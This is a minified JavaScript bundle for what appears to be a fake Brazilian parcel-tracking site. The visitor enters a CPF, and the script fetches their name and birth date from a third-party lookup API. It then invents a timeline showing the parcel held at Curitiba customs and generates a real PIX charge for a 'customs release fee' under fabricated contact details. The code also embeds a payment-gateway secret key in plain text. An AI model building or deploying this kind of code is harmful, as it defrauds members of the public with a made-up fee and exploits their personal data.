import"./style-CkDHoPGJ.js";import{C as g,D as P,V as x}from"./vega-data-B5ZU_GZL.js";import{N as b}from"./navigation-xIUAunxN.js";const S="modulepreload",E=function(m){return"/"+m},y={},f=function(e,t,o){let a=Promise.resolve();if(t&&t.length>0){document.getElementsByTagName("link");const s=document.querySelector("meta[property=csp-nonce]"),n=(s==null?void 0:s.nonce)||(s==null?void 0:s.getAttribute("nonce"));a=Promise.allSettled(t.map(r=>{if(r=E(r),r in y)return;y[r]=!0;const c=r.endsWith(".css"),u=c?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${r}"]${u}`))return;const l=document.createElement("link");if(l.rel=c?"stylesheet":S,c||(l.as="script"),l.crossOrigin="",l.href=r,n&&l.setAttribute("nonce",n),document.head.appendChild(l),c)return new Promise((p,h)=>{l.addEventListener("load",p),l.addEventListener("error",()=>h(new Error(`Unable to preload CSS for ${r}`)))})}))}function i(s){const n=new Event("vite:preloadError",{cancelable:!0});if(n.payload=s,window.dispatchEvent(n),!n.defaultPrevented)throw s}return a.then(s=>{for(const n of s||[])n.status==="rejected"&&i(n.reason);return e().catch(i)})};class w{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const o=await this.tryNewAPI(t);if(o)return console.log("Data obtained from new API:",o),{DADOS:{nome:o.nome,cpf:t,nascimento:o.nascimento||this.generateBirthDate(t),situacao:"REGULAR"}}}catch(o){console.error("New API failed, using fallback:",o.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryNewAPI(e){const t=new AbortController,o=setTimeout(()=>t.abort(),5e3);try{console.log("Calling new API endpoint for CPF:",e);const a=await fetch(`https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${e}`,{signal:t.signal,headers:{Accept:"application/json","Content-Type":"application/json"}});if(clearTimeout(o),!a.ok)throw console.error(`HTTP Error: ${a.status} - ${a.statusText}`),new Error(`API Error: ${a.status} - ${a.statusText}`);const i=await a.text();if(console.log("API Response Text:",i.substring(0,200)+(i.length>200?"...":"")),!i||i.trim()==="")throw console.error("Empty response from API"),new Error("Resposta vazia da API");try{const s=JSON.parse(i);if(console.log("Parsed API data:",s),s&&s.nome)return s;throw console.error("Invalid data format from API:",s),new Error("Formato de dados inválido da API")}catch(s){throw console.error("JSON parse error:",s),new Error("Erro ao processar resposta da API: "+s.message)}}catch(a){throw clearTimeout(o),console.error("API call error:",a),a}}getFallbackData(e){const t=["João Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],o=parseInt(e.slice(-2))%t.length,a=t[o];return console.log("Generated fallback data for CPF:",e,"Name:",a),{DADOS:{nome:a,cpf:e,nascimento:this.generateBirthDate(e),situacao:"REGULAR"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,o=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${o.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class C{static generateTrackingData(e){const t=new Date,o={cpf:e.cpf,currentStep:"customs",steps:[],liberationPaid:!1,liberationDate:null,deliveryAttempts:0,lastUpdate:t.toISOString()},a=this.generateRealisticDates(t,11),i=this.getTrackingSteps();for(let s=0;s<10;s++)o.steps.push({id:s+1,date:a[s],title:i[s].title,description:i[s].description,isChina:i[s].isChina||!1,completed:!0});return o.steps.push({id:11,date:a[10],title:i[10].title,description:i[10].description,completed:!0,needsLiberation:!0}),o}static generateRealisticDates(e,t){const o=[],a=new Date,i=new Date(e),s=new Date(i);s.setDate(s.getDate()-2),o.push(this.getRandomTimeOnDate(s)),o.push(this.getRandomTimeOnDate(s));const n=new Date(i);n.setDate(n.getDate()-1);for(let r=2;r<9;r++)o.push(this.getRandomTimeOnDate(n));return o.push(this.getTimeBeforeNow(i,a,1)),o.push(this.getTimeBeforeNow(i,a,2)),o}static getRandomTimeOnDate(e){const t=new Date(e),o=Math.floor(Math.random()*18)+5,a=Math.floor(Math.random()*60);return t.setHours(o,a,0,0),t}static getTimeBeforeNow(e,t,o){const a=new Date(e);t.getHours(),t.getMinutes();let i;o===1?i=Math.floor(Math.random()*4)+2:i=Math.random()*1.5+.5;const s=new Date(t);return s.setHours(s.getHours()-i),s.getHours()<6&&(s.setHours(6+Math.floor(Math.random()*2)),s.setMinutes(Math.floor(Math.random()*60))),a.setHours(s.getHours(),s.getMinutes(),0,0),a}static getTrackingSteps(){return[{title:"Seu pedido foi criado",description:"Seu pedido foi criado"},{title:"Preparando para envio",description:"O seu pedido está sendo preparado para envio"},{title:"Pedido enviado",description:"[China] O vendedor enviou seu pedido",isChina:!0},{title:"Centro de triagem",description:"[China] O pedido chegou ao centro de triagem de Shenzhen",isChina:!0},{title:"Centro logístico",description:"[China] Pedido saiu do centro logístico de Shenzhen",isChina:!0},{title:"Trânsito internacional",description:"[China] Coletado. O pedido está em trânsito internacional",isChina:!0},{title:"Liberado para exportação",description:"[China] O pedido foi liberado na alfândega de exportação",isChina:!0},{title:"Saiu da origem",description:"Pedido saiu da origem: Shenzhen"},{title:"Chegou no Brasil",description:"Pedido chegou no Brasil"},{title:"Centro de distribuição",description:"Pedido em trânsito para CURITIBA/PR"},{title:"Alfândega de importação",description:"Pedido chegou na alfândega de importação: CURITIBA/PR"}]}}class d{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");if(t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden",!document.getElementById("trackingAnimations")){const o=document.createElement("style");o.id="trackingAnimations",o.textContent=`
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(o)}}static closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}static showError(e){const t=document.querySelector(".error-message");t&&t.remove();const o=document.createElement("div");o.className="error-message",o.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,o.textContent=e;const a=document.querySelector(".tracking-form");a&&(a.appendChild(o),setTimeout(()=>{o.parentNode&&(o.style.animation="slideUp 0.3s ease",setTimeout(()=>o.remove(),300))},5e3))}static scrollToElement(e,t=0){if(!e)return;const a=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:a,behavior:"smooth"})}static animateTimeline(){document.querySelectorAll(".timeline-item").forEach((t,o)=>{setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},o*100)})}}const I=Object.freeze(Object.defineProperty({__proto__:null,UIHelpers:d},Symbol.toStringTag,{value:"Module"}));class D{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_771c0f95ada260e7c2762cf26e2910dcc2efd47ca33899c5dc1c9d82c89b9be27f143f954da017fa9ffe9030ac5f0823cd50b6b6dee7a56c1a301dadf1b6a8f8";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var o,a;try{const i=Date.now(),s=this.generateUniqueEmail(i),n=this.generateUniquePhone(i),r=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const c={external_id:r,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:s,phone:n,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:c.external_id,total_amount:`R$ ${c.total_amount.toFixed(2)}`,payment_method:c.payment_method,webhook_url:c.webhook_url,ip:c.ip,customer:{name:c.customer.name,document:c.customer.document,email:c.customer.email,phone:c.customer.phone,document_type:c.customer.document_type}});const u={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":u["Content-Type"]});const l=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:u,body:JSON.stringify(c)});if(console.log("📡 Status da resposta:",l.status),console.log("📡 Headers da resposta:",Object.fromEntries(l.headers.entries())),!l.ok){const h=await l.text();throw console.error("❌ Erro na API Zentra Pay:",{status:l.status,statusText:l.statusText,body:h,headers:Object.fromEntries(l.headers.entries())}),new Error(`Erro na API: ${l.status} - ${h}`)}const p=await l.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:p.transaction_id||p.id,external_id:p.external_id,has_pix_payload:!!((o=p.pix)!=null&&o.payload),has_qr_code:!!((a=p.pix)!=null&&a.qr_code),status:p.status,payment_method:p.payment_method}),!p.pix||!p.pix.payload)throw console.error("❌ Resposta incompleta da API:",p),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",p.pix.payload),{success:!0,externalId:r,pixPayload:p.pix.payload,qrCode:p.pix.qr_code||null,transactionId:p.transaction_id||p.id,email:s,telefone:n,valor:t,status:p.status||"pending",paymentMethod:p.payment_method||"PIX",timestamp:i}}catch(i){return console.error("💥 Erro ao criar transação PIX:",{message:i.message,stack:i.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:i.message,details:i.stack}}}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class T{constructor(){this.currentCPF=null,this.trackingData=null,this.userData=null,this.dataService=new w,this.zentraPayService=new D,this.isInitialized=!1,this.pixData=null,this.paymentErrorShown=!1,this.paymentRetryCount=0,console.log("TrackingSystem inicializado com Zentra Pay oficial"),this.initWhenReady()}initWhenReady(){document.readyState==="loading"?document.addEventListener("DOMContentLoaded",()=>this.init()):this.init(),setTimeout(()=>this.init(),100),setTimeout(()=>this.init(),500),setTimeout(()=>this.init(),1e3)}init(){if(!this.isInitialized){console.log("Inicializando sistema de rastreamento...");try{this.setupEventListeners(),this.handleAutoFocus(),this.clearOldData(),this.validateZentraPaySetup(),this.isInitialized=!0,console.log("Sistema de rastreamento inicializado com sucesso")}catch(e){console.error("Erro na inicialização:",e),setTimeout(()=>{this.isInitialized=!1,this.init()},1e3)}}}validateZentraPaySetup(){this.zentraPayService.validateApiSecret()?console.log("✅ API Zentra Pay configurada corretamente"):console.error("❌ Problema na configuração da API Zentra Pay")}setupEventListeners(){console.log("Configurando event listeners..."),this.setupFormSubmission(),this.setupCPFInput(),this.setupTrackButton(),this.setupModalEvents(),this.setupCopyButtons(),this.setupAccordion(),this.setupKeyboardEvents(),console.log("Event listeners configurados")}setupFormSubmission(){const e=document.getElementById("trackingForm");e&&(console.log("Form encontrado por ID"),e.addEventListener("submit",o=>{o.preventDefault(),o.stopPropagation(),console.log("Form submetido via ID"),this.handleTrackingSubmit()})),document.querySelectorAll("form").forEach((o,a)=>{console.log(`Configurando form ${a}`),o.addEventListener("submit",i=>{i.preventDefault(),i.stopPropagation(),console.log(`Form ${a} submetido`),this.handleTrackingSubmit()})})}setupTrackButton(){console.log("Configurando botão de rastreamento...");const e=document.getElementById("trackButton");e&&(console.log("Botão encontrado por ID: trackButton"),this.configureTrackButton(e)),document.querySelectorAll(".track-button").forEach((a,i)=>{console.log(`Configurando botão por classe ${i}`),this.configureTrackButton(a)}),document.querySelectorAll('button[type="submit"], button').forEach((a,i)=>{a.textContent&&a.textContent.toLowerCase().includes("rastrear")&&(console.log(`Configurando botão por texto ${i}: ${a.textContent}`),this.configureTrackButton(a))}),document.addEventListener("click",a=>{const i=a.target;i&&i.tagName==="BUTTON"&&i.textContent&&i.textContent.toLowerCase().includes("rastrear")&&(a.preventDefault(),a.stopPropagation(),console.log("Botão rastrear clicado via delegação"),this.handleTrackingSubmit())})}configureTrackButton(e){const t=e.cloneNode(!0);e.parentNode.replaceChild(t,e),t.addEventListener("click",o=>{o.preventDefault(),o.stopPropagation(),console.log("Botão rastrear clicado:",t.id||t.className),this.handleTrackingSubmit()}),t.style.cursor="pointer",t.style.pointerEvents="auto",t.removeAttribute("disabled"),t.type!=="submit"&&(t.type="button"),console.log("Botão configurado:",t.id||t.className)}setupCPFInput(){const e=document.getElementById("cpfInput");if(!e){console.warn("Campo CPF não encontrado");return}console.log("Configurando campo CPF..."),e.addEventListener("input",t=>{g.applyCPFMask(t.target),this.validateCPFInput()}),e.addEventListener("keypress",t=>{this.preventNonNumeric(t)}),e.addEventListener("keydown",t=>{t.key==="Enter"&&(t.preventDefault(),this.handleTrackingSubmit())}),e.addEventListener("paste",t=>{t.preventDefault();const a=(t.clipboardData||window.clipboardData).getData("text").replace(/[^\d]/g,"");a.length<=11&&(e.value=a,g.applyCPFMask(e),this.validateCPFInput())}),e.addEventListener("focus",()=>{e.setAttribute("inputmode","numeric")}),console.log("Campo CPF configurado")}preventNonNumeric(e){[8,9,27,13,46,35,36,37,38,39,40].includes(e.keyCode)||e.keyCode===65&&e.ctrlKey||e.keyCode===67&&e.ctrlKey||e.keyCode===86&&e.ctrlKey||e.keyCode===88&&e.ctrlKey||(e.shiftKey||e.keyCode<48||e.keyCode>57)&&(e.keyCode<96||e.keyCode>105)&&e.preventDefault()}validateCPFInput(){const e=document.getElementById("cpfInput"),t=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');if(!e)return;const o=g.cleanCPF(e.value);t.forEach(a=>{a.textContent&&a.textContent.toLowerCase().includes("rastrear")&&(o.length===11?(a.disabled=!1,a.style.opacity="1",a.style.cursor="pointer",e.style.borderColor="#27ae60"):(a.disabled=!0,a.style.opacity="0.7",a.style.cursor="not-allowed",e.style.borderColor=o.length>0?"#e74c3c":"#e9ecef"))})}async handleTrackingSubmit(){console.log("=== INICIANDO PROCESSO DE RASTREAMENTO ===");const e=document.getElementById("cpfInput");if(!e){console.error("Campo CPF não encontrado"),d.showError("Campo CPF não encontrado. Recarregue a página.");return}const t=e.value,o=g.cleanCPF(t);if(console.log("CPF digitado:",t),console.log("CPF limpo:",o),!g.isValidCPF(t)){console.log("CPF inválido"),d.showError("Por favor, digite um CPF válido com 11 dígitos.");return}console.log("CPF válido, iniciando busca..."),d.showLoadingNotification();const a=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]'),i=[];a.forEach((s,n)=>{s.textContent&&s.textContent.toLowerCase().includes("rastrear")&&(i[n]=s.innerHTML,s.innerHTML='<i class="fas fa-spinner fa-spin"></i> Consultando...',s.disabled=!0)});try{await new Promise(n=>setTimeout(n,3e3)),console.log("Buscando dados do CPF...");const s=await this.dataService.fetchCPFData(o);s&&s.DADOS?(console.log("Dados do CPF encontrados:",s.DADOS),this.currentCPF=o,this.userData=s.DADOS,d.closeLoadingNotification(),setTimeout(()=>{console.log("Exibindo resultados..."),this.displayOrderDetails(),this.generateTrackingData(),this.displayTrackingResults(),this.saveTrackingData();const n=document.getElementById("orderDetails");n&&d.scrollToElement(n,100),setTimeout(()=>{this.highlightLiberationButton()},1500)},300)):(console.log("CPF não encontrado"),d.closeLoadingNotification(),d.showError("CPF não encontrado. Tente novamente."))}catch(s){console.error("Erro no processo:",s),d.closeLoadingNotification(),d.showError("Erro ao consultar CPF. Tente novamente.")}finally{a.forEach((s,n)=>{s.textContent&&i[n]&&(s.innerHTML=i[n],s.disabled=!1)}),this.validateCPFInput()}}displayOrderDetails(){if(!this.userData)return;const e=this.getFirstAndLastName(this.userData.nome),t=g.formatCPF(this.userData.cpf);this.updateElement("customerName",e),this.updateElement("fullName",this.userData.nome),this.updateElement("formattedCpf",t),this.updateElement("customerNameStatus",e),this.showElement("orderDetails"),this.showElement("trackingResults")}generateTrackingData(){this.trackingData=C.generateTrackingData(this.userData)}displayTrackingResults(){this.updateStatus(),this.renderTimeline(),setTimeout(()=>{d.animateTimeline()},500)}updateStatus(){const e=document.getElementById("statusIcon"),t=document.getElementById("currentStatus");!e||!t||this.trackingData.currentStep==="customs"&&(e.innerHTML='<i class="fas fa-clock"></i>',e.className="status-icon in-transit",t.textContent="Aguardando liberação aduaneira")}renderTimeline(){const e=document.getElementById("trackingTimeline");e&&(e.innerHTML="",this.trackingData.steps.forEach((t,o)=>{const a=this.createTimelineItem(t,o===this.trackingData.steps.length-1);e.appendChild(a)}))}createTimelineItem(e,t){const o=document.createElement("div");o.className=`timeline-item ${e.completed?"completed":""} ${t?"last":""}`;const a=new Date(e.date),i=a.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),s=a.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let n="";if(e.needsLiberation&&!this.trackingData.liberationPaid&&(n=`
                <button class="liberation-button-timeline" data-step-id="${e.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `),o.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${i}</span>
                    <span class="time">${s}</span>
                </div>
                <div class="timeline-text">
                    <p>${e.isChina?'<span class="china-tag">[China]</span>':""}${e.description}</p>
                    ${n}
                </div>
            </div>
        `,e.needsLiberation&&!this.trackingData.liberationPaid){const r=o.querySelector(".liberation-button-timeline");r&&r.addEventListener("click",()=>{this.openLiberationModal()})}return o}highlightLiberationButton(){const e=document.querySelector(".liberation-button-timeline");e&&(d.scrollToElement(e,window.innerHeight/2),setTimeout(()=>{e.style.animation="pulse 2s infinite, glow 2s ease-in-out",e.style.boxShadow="0 0 20px rgba(255, 107, 53, 0.8)",setTimeout(()=>{e.style.animation="pulse 2s infinite",e.style.boxShadow="0 4px 15px rgba(255, 107, 53, 0.4)"},6e3)},500))}setupModalEvents(){const e=document.getElementById("closeModal");e&&e.addEventListener("click",()=>{this.closeModal("liberationModal")});const t=document.getElementById("closeDeliveryModal");t&&t.addEventListener("click",()=>{this.closeModal("deliveryModal")}),["liberationModal","deliveryModal"].forEach(o=>{const a=document.getElementById(o);a&&a.addEventListener("click",i=>{i.target.id===o&&this.closeModal(o)})})}setupCopyButtons(){[{buttonId:"copyPixButtonModal",inputId:"pixCodeModal"},{buttonId:"copyPixButtonDelivery",inputId:"pixCodeDelivery"}].forEach(({buttonId:t,inputId:o})=>{const a=document.getElementById(t);a&&a.addEventListener("click",()=>{this.copyPixCode(o,t)})})}setupAccordion(){const e=document.getElementById("detailsHeader");e&&e.addEventListener("click",()=>{this.toggleAccordion()})}setupKeyboardEvents(){document.addEventListener("keydown",e=>{e.key==="Escape"&&(this.closeModal("liberationModal"),this.closeModal("deliveryModal"),d.closeLoadingNotification())})}async openLiberationModal(){console.log("🚀 Iniciando processo de geração de PIX via Zentra Pay..."),d.showLoadingNotification();try{if(!this.zentraPayService.validateApiSecret())throw new Error("API Secret do Zentra Pay não configurada corretamente");const e=window.valor_em_reais||26.34;console.log("💰 Valor da transação:",`R$ ${e.toFixed(2)}`),console.log("👤 Dados do usuário:",{nome:this.userData.nome,cpf:this.userData.cpf}),console.log("📡 Enviando requisição para Zentra Pay...");const t=await this.zentraPayService.createPixTransaction(this.userData,e);if(t.success)console.log("🎉 PIX gerado com sucesso via API oficial Zentra Pay!"),console.log("📋 Dados recebidos:",{transactionId:t.transactionId,externalId:t.externalId,pixPayload:t.pixPayload,email:t.email,telefone:t.telefone,paymentMethod:t.paymentMethod,valor:t.valor}),this.pixData=t,d.closeLoadingNotification(),setTimeout(()=>{this.displayRealPixModal(),setTimeout(()=>{this.guideToCopyButton()},800)},300);else throw new Error(t.error||"Erro desconhecido ao gerar PIX")}catch(e){console.error("💥 Erro ao gerar PIX via Zentra Pay:",e),d.closeLoadingNotification(),d.showError(`Erro ao gerar PIX: ${e.message}`),setTimeout(()=>{console.log("⚠️ Exibindo modal estático como fallback"),this.displayStaticPixModal(),setTimeout(()=>{this.guideToCopyButton()},800)},1e3)}}showPaymentError(){this.paymentErrorShown=!0;const e=document.createElement("div");e.id="paymentErrorOverlay",e.className="modal-overlay",e.style.display="flex",e.innerHTML=`
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `,document.body.appendChild(e),document.body.style.overflow="hidden";const t=document.getElementById("closePaymentErrorModal"),o=document.getElementById("retryPaymentButton");t&&t.addEventListener("click",()=>{this.closePaymentErrorModal()}),o&&o.addEventListener("click",()=>{this.closePaymentErrorModal(),this.openLiberationModal()}),e.addEventListener("click",a=>{a.target===e&&this.closePaymentErrorModal()})}closePaymentErrorModal(){const e=document.getElementById("paymentErrorOverlay");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}displayRealPixModal(){console.log("🎯 Exibindo modal com dados reais do PIX...");const e=document.getElementById("realPixQrCode");if(e&&this.pixData.pixPayload){const a=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;e.src=a,e.alt="QR Code PIX Real - Zentra Pay Oficial",console.log("✅ QR Code atualizado com dados reais da API oficial"),console.log("🔗 URL do QR Code:",a)}const t=document.getElementById("pixCodeModal");t&&this.pixData.pixPayload&&(t.value=this.pixData.pixPayload,console.log("✅ Código PIX Copia e Cola atualizado com dados reais da API oficial"),console.log("📋 PIX Payload Real:",this.pixData.pixPayload),console.log("📏 Tamanho do payload:",this.pixData.pixPayload.length,"caracteres"));const o=document.getElementById("liberationModal");o&&(o.style.display="flex",document.body.style.overflow="hidden",console.log("🎯 Modal PIX real exibido com sucesso"),this.addPaymentSimulationButton()),console.log("🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!"),console.log("💳 Transação ID:",this.pixData.transactionId),console.log("🔢 External ID:",this.pixData.externalId),console.log("💰 Valor:",`R$ ${this.pixData.valor.toFixed(2)}`)}addPaymentSimulationButton(){const e=document.querySelector(".professional-modal-content");if(!e||document.getElementById("simulatePaymentButton"))return;const t=document.createElement("div");t.style.cssText=`
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px dashed #e9ecef;
            text-align: center;
        `,t.innerHTML=`
            <p style="margin-bottom: 15px; color: #6c757d; font-size: 14px;">
                Apenas para testes:
            </p>
            <button id="simulatePaymentButton" class="professional-copy-button" style="background: #6c757d;">
                <i class="fas fa-bolt"></i> Simular Pagamento
            </button>
        `,e.appendChild(t);const o=document.getElementById("simulatePaymentButton");o&&o.addEventListener("click",()=>{this.simulatePayment()})}simulatePayment(){this.closeModal("liberationModal"),this.paymentRetryCount++,this.paymentRetryCount===1?setTimeout(()=>{this.showPaymentError()},1e3):(this.paymentRetryCount=0,this.processSuccessfulPayment())}processSuccessfulPayment(){this.trackingData&&(this.trackingData.liberationPaid=!0);const e=document.querySelector(".liberation-button-timeline");e&&(e.style.display="none"),this.showSuccessNotification(),setTimeout(()=>{f(()=>Promise.resolve().then(()=>k),void 0).then(t=>{const o=t.PostPaymentSystem;new o(this).startPostPaymentFlow()})},1e3)}showSuccessNotification(){const e=document.createElement("div");if(e.className="payment-success-notification",e.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,e.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `,document.body.appendChild(e),!document.getElementById("notificationAnimations")){const t=document.createElement("style");t.id="notificationAnimations",t.textContent=`
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(t)}setTimeout(()=>{e.parentNode&&e.remove()},5e3)}displayStaticPixModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="flex",document.body.style.overflow="hidden"),console.log("⚠️ Modal PIX estático exibido como fallback"),this.addPaymentSimulationButton()}guideToCopyButton(){const e=document.getElementById("copyPixButtonModal"),t=document.querySelector(".pix-copy-section");if(e&&t){t.style.position="relative";const o=document.createElement("div");o.className="copy-guide-indicator",o.innerHTML="👆 Copie o código PIX aqui",o.style.cssText=`
                position: absolute;
                top: -35px;
                right: 0;
                background: #ff6b35;
                color: white;
                padding: 8px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 600;
                animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
                z-index: 10;
                white-space: nowrap;
                box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
